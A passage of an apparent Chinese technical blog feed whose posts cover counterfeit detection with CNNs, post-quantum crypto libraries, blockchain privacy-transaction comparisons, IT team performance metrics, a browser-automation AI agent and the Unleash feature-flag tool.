<p>2.1 SVM/kNN分类器。此分类器被历史的、有保证的商品数据所训练，也就是真品图片并带有对特性的文字说明作为训练数据。正确率达到95%。</p>
<p>2.2 CNN网络。作为分类器进一步分类。正确率达到98%。</p>
<p><img src="/2019/10/15/%E9%AB%98%E4%BB%B7%E5%80%BC%E5%95%86%E5%93%81%E9%AA%8C%E7%9C%9F/cnn.png"></p>
</li>
<li><p>经过300万件商品的训练。包括了20类皮革，120类面料，10类纸质材料，10类秋衣。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">（1）皮革：我们从20种类型中捕获了30,000个显微图像皮革。皮革样品来自Restoration</span><br><span class="line">硬件，纽约的Abea Leather和制革厂Haas来自法国，该皮革供应大部分顶级皮革</span><br><span class="line">全球品牌。</span><br><span class="line">（2）面料：我们从120种面料中提取了6,000张图像。织物样品可从Fabric Science套件中获得。</span><br><span class="line">（3）塑料：我们从15种塑料中提取了2000张图像表面。</span><br><span class="line">（4）纸张：我们从10种纸张中提取了2000张图像。纸样品来自Neenah纸。</span><br><span class="line">（5）球衣：我们从2款正品NFL球衣中提取了500张图像。从NFL商店购买；并获得2件假NFL，来自街头小贩。</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="此技术手段的优点"><a href="#此技术手段的优点" class="headerlink" title="此技术手段的优点"></a>此技术手段的优点</h3><ol>
<li>无需埋设任何标识，无需改变商品材料和构造，是一种非侵入式的技术手段</li>
<li>无需对商品一一建立标识。本技术手段可以对复制品进行识别。</li>
<li>可以对新商品进行检验。</li>
<li>本技术手段经济适用，容易被市场所接受。</li>
</ol>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><table>
<thead>
<tr>
<th></th>
<th>SVM better than kNN</th>
<th>CNN</th>
</tr>
</thead>
<tbody><tr>
<td>Leather皮革</td>
<td>93.8%</td>
<td>98.1%</td>
</tr>
<tr>
<td>Fabric面料</td>
<td>92%</td>
<td>98.3%</td>
</tr>
<tr>
<td>Plastic塑料</td>
<td>92.5%</td>
<td>95.3%</td>
</tr>
<tr>
<td>paper纸质</td>
<td>94.3%</td>
<td>95.1%</td>
</tr>
<tr>
<td>Jersey球衣</td>
<td>94%</td>
<td>98.8%</td>
</tr>
</tbody></table>
<h3 id="BTW"><a href="#BTW" class="headerlink" title="BTW"></a>BTW</h3><p>经过笔者的尝试，单纯使用类似于opencv之类图像处理的方法可以解决商品是否是同一件商品，例如在出口到港后的检证。</p>
]]></content>
      <tags>
        <tag>产品设计</tag>
        <tag>商品验真</tag>
      </tags>
  </entry>
  <entry>
    <title>量子安全密码</title>
    <url>/2023/02/20/%E9%87%8F%E5%AD%90%E5%AE%89%E5%85%A8%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<p>在抗量子密码方向，目前The National Institute of Standards and Technology (NIST)已经进入到<a href="https://csrc.nist.gov/Projects/Post-Quantum-Cryptography">第三轮密码学评测/筛选</a>。</p>
<h3 id="Open-Quantum-Safe"><a href="#Open-Quantum-Safe" class="headerlink" title="Open Quantum Safe"></a>Open Quantum Safe</h3><p>关于NIST评测的抗量子密码实验的算法都开源于此项目，<a href="https://openquantumsafe.org/">Open Quantum Safe</a> framework it may be easier to use liboqs ==&gt; <a href="https://github.com/open-quantum-safe/liboqs%E3%80%82%E5%8F%A6%E5%A4%96%E4%B8%80%E4%B8%AA%E6%9B%B4%E5%8A%A0%E5%AE%9E%E7%94%A8%E7%9A%84%E6%8A%97%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E9%9B%86%E5%90%88">https://github.com/open-quantum-safe/liboqs。另外一个更加实用的抗量子密码算法集合</a> ==&gt; <a href="https://github.com/PQClean/PQClean/%E3%80%82">https://github.com/PQClean/PQClean/。</a></p>
<p>他们之中，都有关于 Kyber 和 Dilithium 算法实现，可以直接使用。</p>
<h3 id="Kyber-对称加密算法和非对称加密算法"><a href="#Kyber-对称加密算法和非对称加密算法" class="headerlink" title="Kyber-对称加密算法和非对称加密算法"></a>Kyber-对称加密算法和非对称加密算法</h3><p>该项目由实验室量子方向研究员提供，其开源版本如下：</p>
<ul>
<li>C 语言版本 <a href="https://github.com/pq-crystals/kyber%EF%BC%8C">https://github.com/pq-crystals/kyber，</a> 此版本为官方版本。</li>
<li>Go 语言版本 <a href="https://github.com/symbolicsoft/kyber-k2so%EF%BC%8C%E8%AF%A5%E7%89%88%E6%9C%AC%E4%B8%8E%E4%B8%8B%E9%9D%A2%E7%9A%84node.js%E7%89%88%E6%9C%AC%E7%9A%84%E5%AE%9E%E7%8E%B0%E7%AE%97%E6%B3%95%E6%98%AF%E4%B8%80%E8%87%B4%E7%9A%84%EF%BC%8C%E8%AE%BA%E6%96%87%E5%A6%82%E4%B8%8B%E3%80%82">https://github.com/symbolicsoft/kyber-k2so，该版本与下面的node.js版本的实现算法是一致的，论文如下。</a></li>
<li>javascript/node.js 语言版本 <a href="https://github.com/antontutoveanu/crystals-kyber-javascript%EF%BC%8C%E5%85%B7%E4%BD%93%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95%E7%9A%84%E8%AE%BA%E6%96%87">https://github.com/antontutoveanu/crystals-kyber-javascript，具体实现方法的论文</a> ==&gt; <a href="https://eprint.iacr.org/2021/356.pdf%E3%80%82">https://eprint.iacr.org/2021/356.pdf。</a></li>
</ul>
<p>​    Kyber 包含了<strong>对称加密算法和非对称加密算法</strong>，Kyber 算法的介绍内容 ==&gt; <a href="https://pq-crystals.org/kyber/software.shtml%E3%80%82">https://pq-crystals.org/kyber/software.shtml。</a></p>
<p>​    一句话概括其算法 ==&gt; Kyber IND-CCA2-secure key encapsulation mechanism (KEM), whose security is based on the hardness of solving the learning-with-errors (LWE) problem over module lattices. </p>
<p>​    使用方法：</p>
<ul>
<li>在所谓的混合模式下使用 Kyber 并结合已建立的“前量子”安全性； 例如结合椭圆曲线 Diffie-Hellman。</li>
<li>建议使用 Kyber-768 参数集，根据保守的分析，该参数集可针对所有已知的经典攻击和量子攻击实现超过 128 位的安全性。</li>
</ul>
<h3 id="Dilithium-数字签名算法"><a href="#Dilithium-数字签名算法" class="headerlink" title="Dilithium-数字签名算法"></a>Dilithium-数字签名算法</h3><ul>
<li>C 语言版本 <a href="https://github.com/pq-crystals/dilithium/%E3%80%82">https://github.com/pq-crystals/dilithium/。</a></li>
<li>rust 语言版本 <a href="https://github.com/Argyle-Software/dilithium%E3%80%82">https://github.com/Argyle-Software/dilithium。</a></li>
<li>Java 语言版本 <a href="https://github.com/mthiim/dilithium-java">https://github.com/mthiim/dilithium-java</a></li>
</ul>
<p>​    算法介绍 ==&gt; <a href="https://www.pq-crystals.org/dilithium/%E3%80%82">https://www.pq-crystals.org/dilithium/。</a></p>
<p>​    具体实现的论文 ==&gt; <a href="https://www.pq-crystals.org/dilithium/resources.shtml%EF%BC%8C%E7%9B%AE%E5%89%8D%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%B8%BA">https://www.pq-crystals.org/dilithium/resources.shtml，目前最新版本为</a> CRYSTALS-Dilithium – Algorithm Specifications and Supporting Documentation (Version 3.1)</p>
]]></content>
      <tags>
        <tag>量子</tag>
      </tags>
  </entry>
  <entry>
    <title>比较-隐私交易Nightfall和Zeto和Zether和ZAMA</title>
    <url>/2024/09/12/%E6%AF%94%E8%BE%83-%E9%9A%90%E7%A7%81%E4%BA%A4%E6%98%93Nightfall%E5%92%8CZeto%E5%92%8CZether%E5%92%8CZAMA/</url>
    <content><![CDATA[<p>以下是 <a href="https://github.com/EYBlockchain/nightfall_3">Nightfall_3</a>、<a href="https://github.com/hyperledger-labs/zeto">Zeto</a> 、 <a href="https://github.com/Consensys/anonymous-zether">Zether</a> 和 <a href="https://github.com/zama-ai/fhevm">ZAMA</a> 的详细比较，从隐私算法到交易花费、时长、限制等多个维度进行分析：</p>
<table>
<thead>
<tr>
<th><strong>Attribute</strong></th>
<th><strong>Nightfall_3</strong></th>
<th><strong>Zeto</strong></th>
<th align="left"><strong>Zether</strong></th>
<th align="left"><a href="https://www.jpmorgan.com/kinexys/documents/JPMC-Kinexys-Project-Epic-Whitepaper-2024.pdf">kinexys by JPMorgan </a>| ZAMA</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Privacy Algorithm</strong></td>
<td>ZK-SNARKS, Groth16 by Circom</td>
<td>ZK-SNARKS, Groth16 by Circom</td>
<td align="left">Bullet-Proof with ElGamal encryption and homomorphic addition</td>
<td align="left">Kinexys used Zama’s open-source fhEVM-native solution to keep balances and transaction amounts encrypted, ensuring confidentiality while maintaining composability through FHE.</td>
</tr>
<tr>
<td><strong>Anonymity</strong></td>
<td>Extremely high, anonymity achieved with hashes and ZKPs.</td>
<td>Extremely high, Stealth Addresses.</td>
<td align="left">Medium, the identity of transactors hidden among the anonymity set.</td>
<td align="left">Extremely high, Stealth Addresses.</td>
</tr>
<tr>
<td><strong>Transaction Model</strong></td>
<td>UTXO</td>
<td>UTXO</td>
<td align="left">Account Balance State</td>
<td align="left">Account Balance State</td>
</tr>
<tr>
<td><strong>Non-repudiation</strong></td>
<td>Not currently supported, transaction submitters can deny.</td>
<td><strong>Supported</strong>, when using the circuit requiring encrypted secrets for the authority.</td>
<td align="left">Not currently supported, auditing balance requires a special viewing key that involves additional cryptography.</td>
<td align="left"><strong>Supported</strong>, FHE ‘s KMS operator would need to provision the auditor with the FHE decryption key to review all transactions. The stealth address service could also specify addresses that are allowed to decrypt transactions.</td>
</tr>
<tr>
<td><strong>Public Chain Support</strong></td>
<td>Supported on EVM based blockchains. Ethereum, Optimistic Layer 2, Linea, Polygon, etc.</td>
<td>Supported on EVM based blockchains. Ethereum, Optimistic Layer 2, Polygon, etc.</td>
<td align="left">Supported on EVM based blockchains. Ethereum, Optimistic Layer 2, Polygon, etc. <strong>ZK Rollup deployment has failed.</strong></td>
<td align="left">Supported on EVM based blockchains.</td>
</tr>
<tr>
<td><strong>Transaction Cost</strong></td>
<td><strong>Low</strong>, ZK verification happens off-chain.</td>
<td>High, ZK SNARKS verification on-chain with varied cost depending on the usage of encryption and non-traceability.</td>
<td align="left">High, bulletproof verification on-chain is more costly than ZK SNARKS based proofs.</td>
<td align="left">High.</td>
</tr>
<tr>
<td><strong>Transaction Delay</strong></td>
<td>1~2 blocks time</td>
<td>1~2 blocks time</td>
<td align="left">1~2 blocks time</td>
<td align="left">1~2 blocks time</td>
</tr>
<tr>
<td><strong>Standard Tokens Support</strong></td>
<td>Both fungible and non-fungible tokens with ERC20 and ERC721 tokens anchoring.</td>
<td>Only fungible tokens with ERC20 tokens anchoring.</td>
<td align="left">Only fungible tokens with ERC20 tokens anchoring.</td>
<td align="left">Only fungible tokens with ERC20 tokens anchoring.</td>
</tr>
<tr>
<td><strong>Double-spending Prevention</strong></td>
<td>Nullifier (<strong>offchain</strong>) mechanism prevents double spending.</td>
<td>UTXO or nullifier (<strong>offchain</strong>) based double spend prevention depending on the specific implementation.</td>
<td align="left">ElGamal encryption (<strong>onchain</strong>) homomorphic computation combined with zero-knowledge proofs prevent double spending.</td>
<td align="left">FHE (<strong>onchain</strong>) prevent double spending. ElGamal encryption (offchain).</td>
</tr>
<tr>
<td><strong>Programmability</strong></td>
<td>Limited programmability due to the optimistic transaction design with off-chain ZKP verification.</td>
<td>Full programmability across multiple UTXOs. Supported by Paladin for programmable privacy.</td>
<td align="left">Full programmability due to on-chain verifications.</td>
<td align="left">Full with ZAMA framework.</td>
</tr>
<tr>
<td><strong>Limitations</strong></td>
<td>The optimistic transaction model means a confirmation window of multiple days to transaction finality.</td>
<td>Fragmented UTXOs require new transactions to transfer multiple UTXOs. No fee custom implementations.</td>
<td align="left">Only one spending transaction per account can occur within one epoch (approximately two block times). Limited self-custody wallet support.</td>
<td align="left">ZAMA(FHE) + Stealth Addresses</td>
</tr>
<tr>
<td><strong>Scalability</strong></td>
<td>Low. Relies on a centralized sequencer/block proposer.</td>
<td>High, peer-to-peer transactions. Solutions based on UTXOs.</td>
<td align="left">Low. Limited by the one spending transaction per account per epoch design.</td>
<td align="left">High. Offchain service - ZAMA(FHE) + Stealth Addresses</td>
</tr>
<tr>
<td><strong>Community Support</strong></td>
<td>Questionable, abandoned by Polygon for a ZK-based Layer 2. Only supports code from EY. GPL-3.0 license.</td>
<td>Hosted in LFDT Labs (formerly Hyperledger Labs). Active, supported by Kaleido.</td>
<td align="left">Weak, supported by Consensys but no updates in the last two years. Apache License 2.0 View license.</td>
<td align="left"><strong>BSD-3-Clause-Clear</strong> license. To commercially use Zama’s technology you need to be granted Zama’s patent license.</td>
</tr>
<tr>
<td>Reference link</td>
<td></td>
<td></td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<ol>
<li><a href="https://www.jpmorgan.com/kinexys/documents/JPMC-Kinexys-Project-Epic-Whitepaper-2024.pdf">https://www.jpmorgan.com/kinexys/documents/JPMC-Kinexys-Project-Epic-Whitepaper-2024.pdf</a></li>
<li><a href="https://github.com/Inco-fhevm/confidential-erc20-framework/blob/main/whitepaper.pdf">https://github.com/Inco-fhevm/confidential-erc20-framework/blob/main/whitepaper.pdf</a></li>
<li><a href="https://github.com/Inco-fhevm/confidential-erc20-framework/">https://github.com/Inco-fhevm/confidential-erc20-framework/</a></li>
</ol>
]]></content>
      <tags>
        <tag>零知识证明</tag>
        <tag>CBDC</tag>
        <tag>区块链</tag>
        <tag>隐私计算</tag>
      </tags>
  </entry>
  <entry>
    <title>渣打贸易金融ABS-Token</title>
    <url>/2023/07/31/%E6%B8%A3%E6%89%93%E8%B4%B8%E6%98%93%E9%87%91%E8%9E%8DABS-Token/</url>
    <content><![CDATA[<h3 id="https-goerli-etherscan-io-token-0x931551EC0bB82bEbB81Bce7152a24c8F01e78e17"><a href="#https-goerli-etherscan-io-token-0x931551EC0bB82bEbB81Bce7152a24c8F01e78e17" class="headerlink" title="https://goerli.etherscan.io/token/0x931551EC0bB82bEbB81Bce7152a24c8F01e78e17"></a><a href="https://goerli.etherscan.io/token/0x931551EC0bB82bEbB81Bce7152a24c8F01e78e17">https://goerli.etherscan.io/token/0x931551EC0bB82bEbB81Bce7152a24c8F01e78e17</a></h3><p><img src="/2023/07/31/%E6%B8%A3%E6%89%93%E8%B4%B8%E6%98%93%E9%87%91%E8%9E%8DABS-Token/1.jpg" alt="1"></p>
]]></content>
      <tags>
        <tag>Solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>Cloud+AI时间下超大型IT团队绩效指标体系</title>
    <url>/2025/03/31/Cloud+AI%E6%97%B6%E9%97%B4%E4%B8%8B%E8%B6%85%E5%A4%A7%E5%9E%8BIT%E5%9B%A2%E9%98%9F%E7%BB%A9%E6%95%88%E6%8C%87%E6%A0%87%E4%BD%93%E7%B3%BB/</url>
    <content><![CDATA[<p>随着Cloud云计算与AI编码辅助工具（如Copilot、Cursor）的广泛普及，大型企业IT部门传统的开发模式正快速转型。大量重复性工作实现自动化，工程师的工作重心逐渐向更高价值的业务交付、风险控制和创新转移。这就促使我们对超大型企业IT团队的绩效管理方法进行全新的审视与重构。<br>在新的绩效体系中，我们刻意削减传统的量化指标（如代码行数、任务数量），取而代之的是更能体现业务影响力和技术稳健性的指标。指标覆盖了业务价值（驱动业务增长）、风险管理（确保系统稳定与合规）、协作传播（提升团队知识协作效能）和效率创新（推动长期竞争力提升）。</p>
<h3 id="超大型IT团队绩效指标体系（Cloud-AI-era）"><a href="#超大型IT团队绩效指标体系（Cloud-AI-era）" class="headerlink" title="超大型IT团队绩效指标体系（Cloud+AI era）"></a>超大型IT团队绩效指标体系（Cloud+AI era）</h3><p><strong>总权重分配原则</strong>：业务价值（35%） &gt; 质量与风险（30%） &gt; 协作与知识（20%） &gt; 效率与创新（15%）  </p>
<h4 id="1-业务价值贡献（35-）"><a href="#1-业务价值贡献（35-）" class="headerlink" title="1. 业务价值贡献（35%）"></a><strong>1. 业务价值贡献（35%）</strong></h4><table>
<thead>
<tr>
<th>指标名称</th>
<th>定义与解释</th>
<th>权重</th>
<th>数据获取方式</th>
</tr>
</thead>
<tbody><tr>
<td><strong>业务需求交付率</strong></td>
<td>年度关键业务需求（如跨境支付系统升级）按时交付的百分比</td>
<td>15%</td>
<td>Jira任务完成统计、PMO项目管理报告、代码行数</td>
</tr>
<tr>
<td><strong>客户满意度（NPS）</strong></td>
<td>内部/外部客户对IT服务的净推荐值（如API响应速度、系统易用性）</td>
<td>5%</td>
<td>定期用户满意度调查、SurveyMonkey报告</td>
</tr>
<tr>
<td><strong>云成本优化率</strong></td>
<td>通过云资源调度（如Spot实例、自动伸缩）节省的年度成本比例（例：降低15%）</td>
<td>5%</td>
<td>云平台计费报告（如AWS Cost Explorer）</td>
</tr>
<tr>
<td><strong>AI工具业务渗透率</strong></td>
<td>AI生成代码在核心业务系统（如风控模型）中的占比及有效性验证</td>
<td>5%</td>
<td>GitHub Copilot Insights、Git Commit分析</td>
</tr>
<tr>
<td><strong>交易系统延迟优化</strong></td>
<td>高频交易系统延迟降低百分比（如从5ms降至3ms）</td>
<td>5%</td>
<td>实时监控工具（如Prometheus、Grafana、Amazon CloudWatch、GCP Monitoring、Azure OpenTelemetry）</td>
</tr>
</tbody></table>
<h4 id="2-质量与风险管理（30-）"><a href="#2-质量与风险管理（30-）" class="headerlink" title="2. 质量与风险管理（30%）"></a><strong>2. 质量与风险管理（30%）</strong></h4><table>
<thead>
<tr>
<th>指标名称</th>
<th>定义与解释</th>
<th>权重</th>
<th>数据获取方式</th>
</tr>
</thead>
<tbody><tr>
<td><strong>系统可用率（SLA）</strong></td>
<td>核心系统年度可用性达标率（如99.99%）</td>
<td>8%</td>
<td>Prometheus/Grafana监控报表</td>
</tr>
<tr>
<td><strong>MTTR - Time to Restore Service 平均故障修复时间</strong></td>
<td>生产环境故障从发生到恢复的平均时间（例：≤30分钟）</td>
<td>7%</td>
<td>Incident管理平台（如ServiceNow）报告</td>
</tr>
<tr>
<td><strong>安全漏洞修复时效</strong></td>
<td>高危漏洞从发现到修复的平均时间（如72小时内）</td>
<td>6%</td>
<td>漏洞扫描报告（如SonarQube、Qualys、Nessus）、Jira安全任务统计</td>
</tr>
<tr>
<td><strong>合规审计通过率</strong></td>
<td>通过监管审计（如SOX、GDPR）的条款覆盖率</td>
<td>5%</td>
<td>内外审计报告（Compliance部门）</td>
</tr>
<tr>
<td><strong>技术债务清理率</strong></td>
<td>年度清理技术债务（如遗留代码重构）的模块占比</td>
<td>4%</td>
<td>SonarQube技术债务报告</td>
</tr>
</tbody></table>
<h4 id="3-协作与知识传播（20-）"><a href="#3-协作与知识传播（20-）" class="headerlink" title="3. 协作与知识传播（20%）"></a><strong>3. 协作与知识传播（20%）</strong></h4><table>
<thead>
<tr>
<th>指标名称</th>
<th>定义与解释</th>
<th>权重</th>
<th>数据获取方式</th>
</tr>
</thead>
<tbody><tr>
<td><strong>跨团队协作贡献度</strong></td>
<td>解决跨地域/部门协作问题的次数（如协调纽约与伦敦团队完成数据同步方案）</td>
<td>6%</td>
<td>Jira跨团队任务数量、Confluence协作文档</td>
</tr>
<tr>
<td><strong>知识文档复用率</strong></td>
<td>Confluence文档被其他项目引用的次数（如架构设计被10+项目参考）</td>
<td>5%</td>
<td>Confluence使用分析报告、Page浏览量</td>
</tr>
<tr>
<td><strong>内部培训覆盖率</strong></td>
<td>年度组织技术培训覆盖的团队成员比例（如80%参与云安全培训）</td>
<td>4%</td>
<td>HR/培训部门记录（如Learning Management System）</td>
</tr>
<tr>
<td><strong>开源社区贡献</strong></td>
<td>团队向金融科技开源项目（如Apache Fineract）提交的PR/Issue数量</td>
<td>3%</td>
<td>GitHub/GitLab开源项目贡献统计</td>
</tr>
<tr>
<td><strong>新人导师效能</strong></td>
<td>指导的新成员独立交付任务的周期缩短比例（如从3个月降至1.5个月）</td>
<td>2%</td>
<td>新人培训与交付统计报告（Mentorship计划跟踪）</td>
</tr>
</tbody></table>
<h4 id="4-效率与创新（15-）"><a href="#4-效率与创新（15-）" class="headerlink" title="4. 效率与创新（15%）"></a><strong>4. 效率与创新（15%）</strong></h4><table>
<thead>
<tr>
<th>指标名称</th>
<th>定义与解释</th>
<th>权重</th>
<th>数据获取方式</th>
</tr>
</thead>
<tbody><tr>
<td><strong>CI/CD流水线成功率</strong></td>
<td>代码从提交到部署的成功率（如从90%提升至98%）</td>
<td>4%</td>
<td>Jenkins/GitLab CI/CD流水线报告</td>
</tr>
<tr>
<td><strong>AI工具采纳效率</strong></td>
<td>Copilot等工具节省的开发时间占比（如每日节省2小时）</td>
<td>3%</td>
<td>GitHub Copilot Analytics、IDE插件使用日志</td>
</tr>
<tr>
<td><strong>自动化测试覆盖率</strong></td>
<td>单元/集成测试覆盖的代码行数比例（如从70%提升至85%）</td>
<td>3%</td>
<td>SonarQube/Jacoco测试覆盖率报告</td>
</tr>
<tr>
<td><strong>创新提案落地数</strong></td>
<td>年度被采纳的技术创新方案（如区块链用于贸易金融）</td>
<td>3%</td>
<td>创新提案跟踪平台（Innovation Portal）</td>
</tr>
<tr>
<td><strong>专利/白皮书发布</strong></td>
<td>团队申请的金融科技专利数量或行业白皮书参与度</td>
<td>2%</td>
<td>法务部门专利申请记录、行业组织发布报告</td>
</tr>
<tr>
<td>在实施过程中，需关注以下几个关键挑战：</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>• <strong>数据质量问题</strong>：定期审查和校验数据的准确性，避免因数据偏差导致绩效不公平。</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>• <strong>AI生成代码风险管理</strong>：建立专门的审查流程，防止AI生成代码带来的安全和合规风险。</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>• <strong>团队文化适应性</strong>：提前沟通，让团队充分理解新绩效考核方式的价值，避免出现阻力和误解。</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>reference link : <a href="https://dora.dev/capabilities/">https://dora.dev/capabilities/</a></p>
]]></content>
      <tags>
        <tag>绩效管理</tag>
      </tags>
  </entry>
  <entry>
    <title>让AI代理操控浏览器并完成任务</title>
    <url>/2025/05/07/%E8%AE%A9AI%E4%BB%A3%E7%90%86%E6%93%8D%E6%8E%A7%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B9%B6%E5%AE%8C%E6%88%90%E4%BB%BB%E5%8A%A1/</url>
    <content><![CDATA[<p>项目地址：<br><a href="https://github.com/zhuang-weiming/browser_use">https://github.com/zhuang-weiming/browser_use</a><br><a href="https://github.com/browser-use/browser-use">https://github.com/browser-use/browser-use</a></p>
<p><strong>​项目目标​</strong>​：<br>Browser-use 是一个开源工具，旨在通过AI代理（如LangChain等）自动化控制浏览器操作，使网站能够被AI直接访问和交互。其核心目标是简化AI与浏览器的连接，支持复杂任务的自动化执行（如购物、求职、文档处理等），同时提升网页DOM元素提取的准确性和效率。</p>
<p>​<strong>​核心功能​</strong>​：</p>
<ol>
<li>​<strong>​浏览器自动化​</strong>​：通过Playwright实现网页操作（点击、输入、导航等）。</li>
<li>​<strong>​多模型支持​</strong>​：兼容OpenAI、Gemini、DeepSeek等大模型，动态生成操作指令。</li>
<li>​<strong>​低代码集成​</strong>​：提供Python库和Gradio UI示例，快速部署AI代理。</li>
<li>​<strong>​任务示例​</strong>​：包括价格对比、简历投递、数据爬取（如Hugging Face模型筛选）等实际场景。</li>
</ol>
<p>​<strong>​未来展望​</strong>​：</p>
<ul>
<li>​<strong>​技术增强​</strong>​：优化AI记忆（RAG）、规划能力及DOM状态处理，减少Token消耗。</li>
<li>​<strong>​用户体验​</strong>​：支持人工干预、提升GIF录制质量，扩展教程和行业用例（如QA测试、社交媒体管理）。</li>
<li>​<strong>​生态合作​</strong>​：组建委员会探索AI友好的UI/UX设计标准，推动软件适配“Agent时代”。</li>
<li>​<strong>​社区与商业化​</strong>​：鼓励贡献（提供免费周边），计划推出云托管服务，降低使用门槛。</li>
</ul>
<p>​<strong>​应用场景​</strong>​：<br>覆盖电商、招聘、数据整理等领域，最终实现“用自然语言指挥浏览器完成复杂任务”的愿景。<br>Demo 1 - Compare the price of gpt-4o and DeepSeek-V3<br><img src="/2025/05/07/%E8%AE%A9AI%E4%BB%A3%E7%90%86%E6%93%8D%E6%8E%A7%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B9%B6%E5%AE%8C%E6%88%90%E4%BB%BB%E5%8A%A1/1.jpg"><br><img src="/2025/05/07/%E8%AE%A9AI%E4%BB%A3%E7%90%86%E6%93%8D%E6%8E%A7%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B9%B6%E5%AE%8C%E6%88%90%E4%BB%BB%E5%8A%A1/4.jpg"></p>
<p>Demo 2 prompt - Compare the price of iPhone 15 Pro Max and Samsung Galaxy S23 Ultra.<br><img src="/2025/05/07/%E8%AE%A9AI%E4%BB%A3%E7%90%86%E6%93%8D%E6%8E%A7%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B9%B6%E5%AE%8C%E6%88%90%E4%BB%BB%E5%8A%A1/2.jpg"><img src="/2025/05/07/%E8%AE%A9AI%E4%BB%A3%E7%90%86%E6%93%8D%E6%8E%A7%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B9%B6%E5%AE%8C%E6%88%90%E4%BB%BB%E5%8A%A1/3.jpg"></p>
]]></content>
      <tags>
        <tag>AI</tag>
        <tag>Agents</tag>
      </tags>
  </entry>
  <entry>
    <title>软件工程之特性管理-feature-management-day-one</title>
    <url>/2025/06/18/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%B9%8B%E7%89%B9%E6%80%A7%E7%AE%A1%E7%90%86-feature-management-day-one/</url>
    <content><![CDATA[<p>以 <a href="https://github.com/Unleash/unleash">https://github.com/Unleash/unleash</a> 为例：<br>Here are the key concepts you’ll need when working with Unleash</p>
<h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p><img src="/2025/06/18/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%B9%8B%E7%89%B9%E6%80%A7%E7%AE%A1%E7%90%86-feature-management-day-one/1.png"></p>
<h3 id="费用"><a href="#费用" class="headerlink" title="费用"></a>费用</h3><p><img src="/2025/06/18/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%B9%8B%E7%89%B9%E6%80%A7%E7%AE%A1%E7%90%86-feature-management-day-one/2.png"><br><img src="/2025/06/18/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%B9%8B%E7%89%B9%E6%80%A7%E7%AE%A1%E7%90%86-feature-management-day-one/3.png"><br><img src="/2025/06/18/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%B9%8B%E7%89%B9%E6%80%A7%E7%AE%A1%E7%90%86-feature-management-day-one/4.png"><br><img src="/2025/06/18/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%B9%8B%E7%89%B9%E6%80%A7%E7%AE%A1%E7%90%86-feature-management-day-one/5.png"></p>
<h3 id="本地运行-Demo-run-on-local"><a href="#本地运行-Demo-run-on-local" class="headerlink" title="本地运行 Demo run on local"></a>本地运行 Demo run on local</h3><p><img src="/2025/06/18/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%B9%8B%E7%89%B9%E6%80%A7%E7%AE%A1%E7%90%86-feature-management-day-one/6.png"></p>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p><img src="/2025/06/18/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%B9%8B%E7%89%B9%E6%80%A7%E7%AE%A1%E7%90%86-feature-management-day-one/7.png"><br><img src="/2025/06/18/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%B9%8B%E7%89%B9%E6%80%A7%E7%AE%A1%E7%90%86-feature-management-day-one/8.png"></p>
<h3 id="配置调整时，默认的-报文-字段"><a href="#配置调整时，默认的-报文-字段" class="headerlink" title="配置调整时，默认的(报文)字段"></a>配置调整时，默认的(报文)字段</h3><p><img src="/2025/06/18/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%B9%8B%E7%89%B9%E6%80%A7%E7%AE%A1%E7%90%86-feature-management-day-one/9.png"></p>
<h3 id="配置调整时，feature的类型"><a href="#配置调整时，feature的类型" class="headerlink" title="配置调整时，feature的类型"></a>配置调整时，feature的类型</h3><p><img src="/2025/06/18/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%B9%8B%E7%89%B9%E6%80%A7%E7%AE%A1%E7%90%86-feature-management-day-one/10.png"></p>
<h3 id="配置调整时，策略-规则"><a href="#配置调整时，策略-规则" class="headerlink" title="配置调整时，策略/规则"></a>配置调整时，策略/规则</h3><p><img src="/2025/06/18/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%B9%8B%E7%89%B9%E6%80%A7%E7%AE%A1%E7%90%86-feature-management-day-one/11.png"></p>
<h3 id="Unleash-SDK支持的语言类型"><a href="#Unleash-SDK支持的语言类型" class="headerlink" title="Unleash SDK支持的语言类型"></a>Unleash SDK支持的语言类型</h3><p><img src="/2025/06/18/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%B9%8B%E7%89%B9%E6%80%A7%E7%AE%A1%E7%90%86-feature-management-day-one/12.png"><br><img src="/2025/06/18/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%B9%8B%E7%89%B9%E6%80%A7%E7%AE%A1%E7%90%86-feature-management-day-one/13.png"></p>
<h3 id="项目端开发指南"><a href="#项目端开发指南" class="headerlink" title="项目端开发指南"></a>项目端开发指南</h3><ol>
